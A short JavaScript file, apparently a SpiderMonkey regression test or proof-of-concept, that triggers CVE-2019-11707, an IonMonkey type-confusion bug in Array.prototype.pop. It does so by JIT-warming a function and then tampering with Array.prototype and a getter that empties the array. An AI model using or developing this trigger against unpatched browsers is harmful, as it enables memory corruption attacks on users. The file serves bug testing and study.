// sm: CVE-2019-11707 (IonMonkey Array.prototype.pop type inference) jit-proto
var a = [1, 2, 3, 4];
var b = [1.5, 2.5, 3.5, 4.5];
function hot(x) { return x.pop(); }
for (var i = 0; i < 300; i++) { hot([1, 2, 3]); hot([1.5, 2.5]); }
Array.prototype.__proto__ = { 3: { evil: 1 } };
b.length = 4; delete b[3];
print(typeof hot(b), b.length);
Object.defineProperty(Array.prototype, 2, { get() { a.length = 0; return 'p'; }, configurable: true });
delete a[2];
print(hot(a), hot(a), a.length);
delete Array.prototype[2];
